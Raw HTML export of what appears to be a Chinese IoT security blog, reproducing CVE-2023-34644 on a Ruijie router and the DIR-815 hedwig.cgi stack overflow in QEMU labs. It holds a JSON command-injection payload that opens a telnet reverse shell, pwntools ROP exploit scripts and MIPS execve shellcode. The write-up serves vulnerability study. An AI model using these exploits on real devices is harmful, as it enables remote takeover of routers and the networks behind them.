<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span><span class="string">&quot;merge&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;params&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;sorry&quot;</span><span class="punctuation">:</span><span class="string">&quot;&#x27;$(mkfifo /tmp/test;telnet 192.168.107.136 6666 0&lt;/tmp/test|/bin/sh &gt; /tmp/test)&#x27;&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="仿真模拟"><a href="#仿真模拟" class="headerlink" title="仿真模拟"></a>仿真模拟</h2><p>net.sh</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">sudo</span> ifconfig eth0 down   <span class="comment">#关闭宿主机网卡接口</span></span></span><br><span class="line">sudo brctl addbr br0   #添加一座名为br0的网桥</span><br><span class="line">sudo brctl addif br0 ens33   #在br0中添加一个接口</span><br><span class="line">sudo brctl stp br0 off   #如果只有一个网桥，则关闭生成树协议</span><br><span class="line">sudo brctl setfd br0 1   #设置br0的转发延迟</span><br><span class="line">sudo brctl sethello br0 1   #设置br0的hello时间</span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up   #启用br0接口</span><br><span class="line">sudo ifconfig ens33 0.0.0.0 promisc up   #启用网卡接口</span><br><span class="line">sudo dhclient br0   #从dhcp服务器获得br0的IP地址</span><br><span class="line">sudo brctl show br0   #查看虚拟网桥列表</span><br><span class="line">sudo brctl showstp br0   #查看br0的各接口信息</span><br><span class="line">sudo tunctl -t tap0 -u root   #创建一个tap0接口，只允许root用户访问</span><br><span class="line">sudo brctl addif br0 tap0   #在虚拟网桥中增加一个tap0接口</span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up   #启用tap0接口</span><br><span class="line">sudo brctl showstp br0</span><br></pre></td></tr></table></figure>

<p>start.sh（qemu启动脚本）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">sudo qemu-system-mipsel \</span><br><span class="line">    -cpu 74Kf \</span><br><span class="line">    -M malta \</span><br><span class="line">    -kernel /home/wen/Desktop/mips_qemu_system/vmlinux-2.6.32-5-4kc-malta \</span><br><span class="line">    -hda /home/wen/Desktop/mips_qemu_system/debian_squeeze_mipsel_standard.qcow2 \</span><br><span class="line">    -append &quot;root=/dev/sda1 console=tty0&quot; \</span><br><span class="line">    -nographic -net nic \</span><br><span class="line">    -net tap,ifname=tap0,script=no,downscript=no</span><br></pre></td></tr></table></figure>

<p>首先将文件系统传到模拟器中</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp ./squashfs-root.tar.gz root@192.168.107.135:/root/</span><br></pre></td></tr></table></figure>

<p>设置squashfs-root作为qemu模拟器的根目录（<strong>exit 退出</strong>）</p>
<blockquote>
<p>仿真系统只是切换了根目录，本质还是<code>qemu</code>虚拟机的系统，故<code>proc</code>和<code>dev</code>这两个重要的系统目录仍应该是这个系统本身的目录，即<code>qemu</code>虚拟机的系统目录，而切换了根目录后，<code>proc</code>和<code>dev</code>也被切换，因此需要挂载为原先的目录</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd squashfs-root</span><br><span class="line">chmod -R 777 ./   #赋予权限</span><br><span class="line">mount --bind /proc ./proc   #将原根目录下的proc和dev挂载到squashfs-root目录下</span><br><span class="line">mount --bind /dev ./dev</span><br><span class="line">chroot . /bin/sh   #将squashfs-root目录切换为根目录</span><br></pre></td></tr></table></figure>

<p>在进行下一步前，先了解一下<strong>路由器根文件系统下的一些重点目录</strong>：</p>
<table>
<thead>
<tr>
<th>目录</th>
<th>存储的文件</th>
</tr>
</thead>
<tbody><tr>
<td><code>bin</code>、<code>sbin</code>目录，<br /><code>/usr/bin</code>、<code>/usr/sbin</code>目录</td>
<td>路由器中的应用程序</td>
</tr>
<tr>
<td><code>lib</code>目录<br /><code>/usr/lib</code>目录</td>
<td>程序运行时需要的动态库文件</td>
</tr>
<tr>
<td><code>etc</code></td>
<td><strong>程序自启动</strong>配置文件，<br /><strong>初始化脚本文件</strong>，<br />各种<strong>服务器（Web服务器）</strong>的配置文件等路由器配置文件</td>
</tr>
</tbody></table>
<blockquote>
<p>首先，对于<code>OpenWRT</code>来说，内核加载完文件系统后，<strong>首先会启动<code>/sbin/init</code>进程</strong>，其中会进一步执行<code>/etc/preinit</code>和<code>/sbin/procd</code>，进行初步初始化。这当然也是仿真模拟的第一步，在启动<code>/sbin/init</code>后，会卡住挂在进程中，我们可以再<code>ssh</code>开一个新窗口进行后续操作，也可以<strong>用<code>/sbin/init &amp;</code>将其作为后台进程执行</strong>。</p>
</blockquote>
<p>执行**<code>/sbin/init</code>**命令，然后<code>ssh root@192.168.107.128</code>另开一个终端</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> squashfs-root</span><br><span class="line"><span class="built_in">chroot</span> . sh</span><br></pre></td></tr></table></figure>

<blockquote>
<p>接着，真实系统会根据<code>/etc/inittab</code>中按编号次序执行<code>/etc/rc.d</code>中的初始化脚本，而<code>/etc/rc.d</code>中的文件都是<code>/etc/init.d</code>中对应文件的软链接。虽然说真实系统会依次执行所有的初始化脚本，但我们此处的仿真只是为了验证我们的漏洞，因此只需要部分仿真即可。</p>
</blockquote>
<p>启动<strong>http</strong>服务，对应<code>/etc/init.d/lighttpd</code>初始化脚本，用**<code>/etc/init.d/lighttpd start</code>**命令启动服务。这一步报错了，缺少<code>/var/run/lighttpd.pid</code>文件，一般这种缺什么补什么就好了，创建<code>/var/run/lighttpd.pid</code>文件即可。</p>
<p>接下来要启动<code>unifyframe-sgi</code>，但是要先执行**<code>/sbin/ubusd</code><strong>启动</strong>usbs<strong>服务，否则后面会报错，然后才能执行</strong><code>/etc/init.d/unifyframe-sgi start</code>**命令启动<code>unifyframe-sgi</code>。</p>
<p>执行**<code>/usr/sbin/unifyframe-sgi.elf</code>**运行程序，报错缺少<code>/tmp/rg_device/rg_device.json</code>文件，结合<code>unifyframe-sgi.elf</code>二进制文件分析，将<code>/sbin/hw/60010081/rg_device.json</code>复制到<code>/tmp/rg_device/</code>目录(该目录由自己创建)下即可。</p>
<h3 id="攻击演示"><a href="#攻击演示" class="headerlink" title="攻击演示"></a>攻击演示</h3><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272143818.png" alt="image-20250427195149569"></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272143832.png" alt="image-20250427195532949"></p>
<h2 id="gdbserver调试"><a href="#gdbserver调试" class="headerlink" title="gdbserver调试"></a>gdbserver调试</h2><p><a href="https://github.com/stayliv3/gdb-static-cross/tree/master/prebuilt">gdbserver下载</a></p>
<p><a href="https://people.debian.org/~aurel32/qemu/mipsel/">kernel下载</a></p>
<p>这里是借助gdbserver通过网络进行远程调试。把下载的对应版本的gdbserver传到qemu模拟器中，在qemu中启动程序并使用gdbserver监听一个端口，然后在宿主机上远程连接即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">直接启动程序调试</span></span><br><span class="line">./gdbserver-7.7.1-mipsel-mips32-v1 :1234 /usr/sbin/unifyframe-sgi.elf</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">劫持已运行的进程调试</span></span><br><span class="line">./gdbserver-7.7.1-mipsel-mips32-v1 :1234 --attach 11623 # 11623是要调试进程的pid</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在宿主机运行下面内容</span></span><br><span class="line">gdb-multiarch</span><br><span class="line">target remote 192.168.107.135:1234</span><br></pre></td></tr></table></figure>

<p>报错：</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; target remote <span class="number">192.168</span><span class="number">.207</span><span class="number">.135</span>:<span class="number">1234</span></span><br><span class="line"></span><br><span class="line">Remote debugging <span class="keyword">using</span> <span class="number">192.168</span><span class="number">.240</span><span class="number">.136</span>:<span class="number">1234</span></span><br><span class="line"><span class="function"><span class="title">Ignoring</span></span> packet error, continuing...</span><br><span class="line">warning: unrecognized item <span class="string">&quot;timeout&quot;</span> in <span class="string">&quot;qSupported&quot;</span> response</span><br><span class="line"><span class="function"><span class="title">Ignoring</span></span> packet error, continuing...</span><br><span class="line">Remote replied unexpectedly to <span class="string">&#x27;vMustReplyEmpty&#x27;</span>: timeout</span><br></pre></td></tr></table></figure>

<p>查了一下是因为仿真环境的内核版本与gdbserver版本不匹配的问题，在启动仿真环境的时候设置<code>-kernel</code>参数为<code>vmlinux-3.2.0-4-4kc-malta</code>版本即可。</p>
<p>这个问题困扰了我不少时间，想到一开始搭建仿真环境的时候，图省事就没有重新下载内核文件用的还是上一个复现DIR815时的内核，没想到啊却因此费了很多时间和精力😅</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/JiMoKuangXiangQu/articles/18812411#211-%E5%87%86%E5%A4%87-%E5%AE%A2%E6%88%B7%E7%AB%AF-gdb-%E7%A8%8B%E5%BA%8F">gdbserver 指南 - JiMoKuangXiangQu - 博客园</a></p>
<p><a href="https://zikh26.github.io/posts/e5651b4f.html#lua%E6%96%87%E4%BB%B6%E7%9A%84%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90">站在巨人肩膀上复现CVE-2023-34644 | ZIKH26’s Blog</a></p>
<p>[<a href="https://bbs.kanxue.com/thread-277386.htm#msg_header_h2_2">原创] 记一次全设备通杀未授权RCE的挖掘经历-智能设备-看雪-安全社区|安全招聘|kanxue.com</a></p>
]]></content>
      <categories>
        <category>IOT安全</category>
        <category>CVE复现</category>
      </categories>
      <tags>
        <tag>IOT安全</tag>
      </tags>
  </entry>
  <entry>
    <title>DIR-815路由器溢出漏洞复现</title>
    <url>/2025/03/28/DIR-815%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>复现的第一个IOT漏洞，算是比较经典的了，网上也有挺多相关的文章。这个漏洞从我复现完到现在有一段时间了，前段时间一直在忙其他事，现在来大致整理一下复现的整个过程，也算是过一个流程吧。</p>
<span id="more"></span>

<h2 id="固件解压"><a href="#固件解压" class="headerlink" title="固件解压"></a>固件解压</h2><h3 id="安装binwalk"><a href="#安装binwalk" class="headerlink" title="安装binwalk"></a>安装binwalk</h3><p>由于新版本binwalk完全重写为Rust语言，故没有setup.py文件，不过可以继续用老版本的binwalk。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/ReFirmLabs/binwalk.git</span><br><span class="line"><span class="built_in">cd</span> binwalk</span><br><span class="line">git checkout v2.3.2</span><br><span class="line"><span class="built_in">sudo</span> python3 setup.py install</span><br></pre></td></tr></table></figure>

<p>安装依赖</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./deps.sh</span><br><span class="line"><span class="comment"># cd ~/Desktop</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get install build-essential liblzma-dev liblzo2-dev zlib1g-dev</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/devttys0/sasquatch.git</span><br><span class="line"><span class="built_in">cd</span> sasquatch</span><br><span class="line">./build.sh</span><br></pre></td></tr></table></figure>

<p>binwalk安装成功后，从官网上先下载下来固件，然后直接运行<code>binwalk -Me DIR-815.bin</code>即可，文件cgibin便是我们要分析的二进制文件。</p>
<p>后面还要用到一个IDA插件，在这里一起说一下安装过程。</p>
<h3 id="IDA插件MIPSROP安装"><a href="#IDA插件MIPSROP安装" class="headerlink" title="IDA插件MIPSROP安装"></a>IDA插件MIPSROP安装</h3><p>ida版本：IDA_Pro_v7.5<br><a href="https://pan.baidu.com/s/1PawhfKbLLELspxzCUa8TUw?pwd=8jf4">下载压缩包</a>，将解压后的所有文件都放到ida根目录下的plugins目录下。然后在ida中执行如下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> mipsrop</span><br><span class="line">mipsrop = mipsrop.MIPSROPFinder()</span><br></pre></td></tr></table></figure>

<p>简单使用：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mipsrop.find(<span class="string">&quot;li .*, 1&quot;</span>)</span><br><span class="line">mipsrop.find(<span class="string">&quot;jr .*&quot;</span>)</span><br><span class="line">mipsrop.stackfinder() </span><br></pre></td></tr></table></figure>

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先在main函数中进入到hedwigcgi_main()函数，需要命令行参数的第一个参数为”hedwig.cgi”</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503301648208.png" alt="image-20250328113504393"></p>
<p>在hedwigcgi_main()函数中，首先会获取环境变量REQUEST_METHOD，并且该环境变量需要为”POST”，才能正常往下走</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503301650778.png" alt="image-20250330155931725"></p>
<p>然后进入到sess_get_uid(v4)函数，在该函数中会获取环境变量HTTP_COOKIE，并将”&#x3D;”前部分的内容传给v2，”&#x3D;”后面的内容传给v4，如果v2等于”uid”才会把v4拼接到a1也就是sess_get_uid函数传进来的v4</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503301650948.png" alt="image-20250330162700720"></p>
<p>接着往下走便是一个栈溢出漏洞，由sprintf函数引发变量v6和前两个字符串会拼接到一起，然后赋给变量v27，变量v6是环境变量HTTP_COOKIE的”&#x3D;”后面的内容我们可以对其任意赋值，而数组v27只有1024个字节大小，故可以进行栈溢出</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503301649525.png" alt="image-20250330163422595" style="zoom:50%;" />

<h2 id="qume用户模式"><a href="#qume用户模式" class="headerlink" title="qume用户模式"></a>qume用户模式</h2><h3 id="exp-sh"><a href="#exp-sh" class="headerlink" title="exp.sh"></a>exp.sh</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">INPUT=&quot;w=&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">LENGTH=$(<span class="built_in">echo</span> -n <span class="string">&quot;w=&quot;</span> | <span class="built_in">wc</span> -c)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">echo</span> <span class="variable">$LENGTH</span></span></span><br><span class="line">cookie=&quot;uid=`cat payload`&quot;</span><br><span class="line">echo $INPUT | qemu-mipsel -L ./ -0 &quot;hedwig.cgi&quot; -E REQUEST_METHOD=&quot;POST&quot; -E CONTENT_LENGTH=2 -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E HTTP_COOKIE=$cookie -E REQUEST_URI=&quot;5799&quot; -g 1234 ./htdocs/web/hedwig.cgi</span><br></pre></td></tr></table></figure>

<p>libc的确定：</p>
<p>这里以memset函数为例，程序中第二次调用该函数时，直接跳转到的地址就是memset函数的实际地址，而知道其实际地址后，有两种方法查看其libc偏移，可以直接在libc文件中查看，也可以在gdb中执行<code>vmmap 实际地址</code>查看其偏移。</p>
<p>这里要说一句，cgibin这个文件一共有2个依赖库和1个动态链接器，而后面要利用到的文件中的system函数是来自libc.so.0这个文件中的，所以要在libc.so.0中查看偏移而不是libgcc_s.so.1</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503301648255.png" alt="image-20250328114454350"></p>
<p>ida中的偏移：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503301648794.png" alt="image-20250305140826839" style="zoom:67%;" />

<p>gdb中的数据：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503301649266.png" alt="image-20250305140338922" style="zoom: 50%;" />

<h3 id="ROP-system"><a href="#ROP-system" class="headerlink" title="ROP-system"></a>ROP-system</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;little&#x27;</span>,word_size=<span class="number">32</span>)</span><br><span class="line"><span class="comment"># offset = 1009</span></span><br><span class="line"><span class="comment"># ret = 0x409A54</span></span><br><span class="line"><span class="comment"># main = 0x004023E0</span></span><br><span class="line"></span><br><span class="line">libc_base = <span class="number">0x7f76ca20</span>-<span class="number">0x00034A20</span> <span class="comment">#0x7F738000</span></span><br><span class="line">sys_addr = <span class="number">0x53200</span>+libc_base-<span class="number">1</span></span><br><span class="line">binsh_addr = <span class="number">0x0006DFD0</span>+libc_base</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;0x00032A98  |  addiu $s0,1   |  jalr  $s1 &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># .text:00032A98                 addiu   $s0, 1</span></span><br><span class="line"><span class="comment"># .text:00032A9C                 li      $s2, 1</span></span><br><span class="line"><span class="comment"># .text:00032AA0                 move    $t9, $s1</span></span><br><span class="line"><span class="comment"># .text:00032AA4                 jalr    $t9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;0x000159F4  |  move $t9,$s0   |  jalr  $s0 &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># .text:000159F4                 move    $t9, $s0</span></span><br><span class="line"><span class="comment"># .text:000159F8                 jalr    $t9 </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;0x00013F8C  |  move $a0,$s3  |  jalr  $s6 &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># .text:00013F8C                 move    $a0, $s3</span></span><br><span class="line"><span class="comment"># .text:00013F90                 move    $t9, $s6</span></span><br><span class="line"><span class="comment"># .text:00013F94                 jalr    $t9</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&quot;uid=&quot;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">1005</span>-<span class="number">0x20</span>-<span class="number">4</span>)+p32(sys_addr)<span class="comment">#s0</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x000159F4</span>)<span class="comment">#s1:move $t9,$s0</span></span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span><span class="comment">#s2</span></span><br><span class="line">payload+=p32(binsh_addr)+<span class="string">b&#x27;c&#x27;</span>*<span class="number">8</span><span class="comment">#s3,s4,s5</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x00032A98</span>)<span class="comment">#s6:addiu $s0,1</span></span><br><span class="line">payload+=<span class="string">b&#x27;d&#x27;</span>*<span class="number">8</span>+p32(libc_base+<span class="number">0x00013F8C</span>)<span class="comment">#$ra:move $a0,$s3</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<p>这个脚本本身是没问题的，但是最后还是会停在这里：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503301648279.png" alt="image-20250305152035603" style="zoom:67%;" />

<p>这是因为system(“&#x2F;bin&#x2F;sh”)中会调用fork()函数来创建一个新的进程，而用户模式下是不支持多进程的。当然系统模式下是可以的。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503301649061.png" alt="image-20250305193748177" style="zoom: 50%;" />

<h3 id="ROP–shellcode"><a href="#ROP–shellcode" class="headerlink" title="ROP–shellcode"></a>ROP–shellcode</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;little&#x27;</span>,word_size=<span class="number">32</span>)</span><br><span class="line"><span class="comment"># offset = 1009</span></span><br><span class="line"><span class="comment"># ret = 0x409A54</span></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">slti $a2, $zero, -1</span></span><br><span class="line"><span class="string">li $t7, 0x69622f2f</span></span><br><span class="line"><span class="string">sw $t7, -12($sp)</span></span><br><span class="line"><span class="string">li $t6, 0x68732f6e</span></span><br><span class="line"><span class="string">sw $t6, -8($sp)</span></span><br><span class="line"><span class="string">sw $zero, -4($sp)</span></span><br><span class="line"><span class="string">la $a0, -12($sp)</span></span><br><span class="line"><span class="string">slti $a1, $zero, -1</span></span><br><span class="line"><span class="string">li $v0, 4011</span></span><br><span class="line"><span class="string">syscall 0x40404</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">libc_base = <span class="number">0x7f76ca20</span>-<span class="number">0x00034A20</span> <span class="comment">#0x7F738000</span></span><br><span class="line">sleep_addr = libc_base+<span class="number">0x00056BD0</span></span><br><span class="line"><span class="string">&quot;.text:000436D0                 move    $t9, $s3&quot;</span></span><br><span class="line"><span class="comment"># .text:000436D4                 lw      $ra, 0x18+var_s14($sp)</span></span><br><span class="line"><span class="comment"># .text:000436D8                 lw      $s4, 0x18+var_s10($sp)</span></span><br><span class="line"><span class="comment"># .text:000436DC                 lw      $s3, 0x18+var_sC($sp)</span></span><br><span class="line"><span class="comment"># .text:000436E0                 lw      $s2, 0x18+var_s8($sp)</span></span><br><span class="line"><span class="comment"># .text:000436E4                 lw      $s1, 0x18+var_s4($sp)</span></span><br><span class="line"><span class="comment"># .text:000436E8                 lw      $s0, 0x18+var_s0($sp)</span></span><br><span class="line"><span class="comment"># .text:000436EC                 jr      $t9</span></span><br><span class="line"><span class="string">&quot;.text:00057E50                 li      $a0, 1&quot;</span></span><br><span class="line"><span class="comment"># .text:00057E54                 move    $t9, $s1</span></span><br><span class="line"><span class="comment"># .text:00057E58                 jalr    $t9 ;</span></span><br><span class="line"><span class="string">&quot;.text:00037E6C                 move    $t9, $a1&quot;</span></span><br><span class="line"><span class="comment"># .text:00037E70                 addiu   $a0, 0x4C  # &#x27;L&#x27;</span></span><br><span class="line"><span class="comment"># .text:00037E74                 jr      $t9</span></span><br><span class="line"><span class="string">&quot;.text:0003B974                 addiu   $a1, $sp, 0x24+var_C&quot;</span></span><br><span class="line"><span class="comment"># .text:0003B978                 move    $t9, $s4</span></span><br><span class="line"><span class="comment"># .text:0003B97C                 jalr    $t9</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">1005</span>-<span class="number">0x20</span>)+<span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span>+p32(libc_base+<span class="number">0x000436D0</span>)</span><br><span class="line">payload += <span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload += p32(sleep_addr)+<span class="string">b&#x27;c&#x27;</span>*<span class="number">20</span> <span class="comment"># s3:sleep(),s4~s8</span></span><br><span class="line">payload += p32(libc_base+<span class="number">0x00057E50</span>) <span class="comment"># ra:li $a0,1 下面的内容全部被写到栈上</span></span><br><span class="line">payload += <span class="string">b&#x27;d&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;e&#x27;</span>*<span class="number">16</span><span class="comment">#SP~SP+20,SP+24~SP+36</span></span><br><span class="line">payload += p32(libc_base+<span class="number">0x00037E6C</span>) <span class="comment"># s4:move  $t9, $a1</span></span><br><span class="line">payload += p32(libc_base+<span class="number">0x0003B974</span>) <span class="comment"># ra:addiu $a1, $sp, 0x18 (=&gt; jalr $s4</span></span><br><span class="line">payload += <span class="string">b&#x27;f&#x27;</span>*<span class="number">24</span></span><br><span class="line">payload += shellcode</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<h2 id="qemu系统模式"><a href="#qemu系统模式" class="headerlink" title="qemu系统模式"></a>qemu系统模式</h2><p>执行下面命令，安装相关工具，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install net-tools</span><br><span class="line"><span class="built_in">sudo</span> apt-get install bridge-utils</span><br><span class="line"><span class="built_in">sudo</span> apt install uml-utilities</span><br></pre></td></tr></table></figure>

<p>分别执行以下命令，也可以将这些命令都写到脚本中，执行脚本文件即可(chmod +x net.sh &amp;&amp; .&#x2F;net.sh)，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">sudo</span> ifconfig eth0 down   <span class="comment">#关闭宿主机网卡接口</span></span></span><br><span class="line">sudo brctl addbr br0   #添加一座名为br0的网桥</span><br><span class="line">sudo brctl addif br0 ens33   #在br0中添加一个接口</span><br><span class="line">sudo brctl stp br0 off   #如果只有一个网桥，则关闭生成树协议</span><br><span class="line">sudo brctl setfd br0 1   #设置br0的转发延迟</span><br><span class="line">sudo brctl sethello br0 1   #设置br0的hello时间</span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up   #启用br0接口</span><br><span class="line">sudo ifconfig ens33 0.0.0.0 promisc up   #启用网卡接口</span><br><span class="line">sudo dhclient br0   #从dhcp服务器获得br0的IP地址</span><br><span class="line">sudo brctl show br0   #查看虚拟网桥列表</span><br><span class="line">sudo brctl showstp br0   #查看br0的各接口信息</span><br><span class="line">sudo tunctl -t tap0 -u root   #创建一个tap0接口，只允许root用户访问</span><br><span class="line">sudo brctl addif br0 tap0   #在虚拟网桥中增加一个tap0接口</span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up   #启用tap0接口</span><br><span class="line">sudo brctl showstp br0</span><br></pre></td></tr></table></figure>

<p>然后再执行下面这个命令来启动，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> qemu-system-mipsel -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> -nographic -net nic -net tap,ifname=tap0,script=no,downscript=no</span><br></pre></td></tr></table></figure>

<p>对上面这个命令的解释：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>qemu-system-mipsel</td>
<td>启动qemu模拟器，指定模拟的目标架构是mips</td>
</tr>
<tr>
<td>-M malta</td>
<td>指定虚拟机的机器类型为Malta，这是一种MIPS架构的开发板</td>
</tr>
<tr>
<td>-kernel vmlinux-2.6.32-5-4kc-malta</td>
<td>指定使用的内核文件，这里是Linux内核</td>
</tr>
<tr>
<td>-hda debian_squeeze_mipsel_standard.qcow2</td>
<td>指定虚拟硬盘文件</td>
</tr>
<tr>
<td>-append “root&#x3D;&#x2F;dev&#x2F;sda1 console&#x3D;tty0”</td>
<td>向内核传递启动参数，指定根文件系统的位置为&#x2F;dev&#x2F;sda1，并启用控制台输出到tty0(虚拟终端)</td>
</tr>
<tr>
<td>-nographic</td>
<td>禁用图形界面</td>
</tr>
<tr>
<td>-net nic</td>
<td>创建一个虚拟网络接口(nic)用于虚拟机通信</td>
</tr>
<tr>
<td>-net tap,ifname&#x3D;tap0,script&#x3D;no,downscript&#x3D;no</td>
<td>指定使用名为tap0的接口，禁用网络脚本防止qemu自动修改网络配置</td>
</tr>
</tbody></table>
<p>在qemu模拟器中可以看到IP地址，并能在宿主机上ping通便是ok了。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503301648304.png" alt="image-20250325223711815" style="zoom:50%;" />

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503301648297.png" alt="image-20250325223749887" style="zoom:50%;" />

<p>将binwalk解压后的文件系统传到qemu模拟器中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> scp -r ./squashfs-root root@192.168.107.135:/root/squashfs-root</span><br></pre></td></tr></table></figure>

<p>然后在qemu中的squashfs-root目录下新建一个<code>http_conf</code>文件写入以下代码（网卡、IP和port要改成自己的）</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">Umask <span class="number">026</span></span><br><span class="line">PIDFile /var/run/httpd.pid</span><br><span class="line">LogGMT <span class="keyword">On</span>  #开启<span class="keyword">log</span></span><br><span class="line">ErrorLog /<span class="keyword">log</span> #<span class="keyword">log</span>文件</span><br><span class="line"></span><br><span class="line">Tuning</span><br><span class="line">&#123;</span><br><span class="line">    NumConnections <span class="number">15</span></span><br><span class="line">    BufSize <span class="number">12288</span></span><br><span class="line">    InputBufSize <span class="number">4096</span></span><br><span class="line">    ScriptBufSize <span class="number">4096</span></span><br><span class="line">    NumHeaders <span class="number">100</span></span><br><span class="line">    Timeout <span class="number">60</span></span><br><span class="line">    ScriptTimeout <span class="number">60</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Control</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">Types</span></span><br><span class="line">    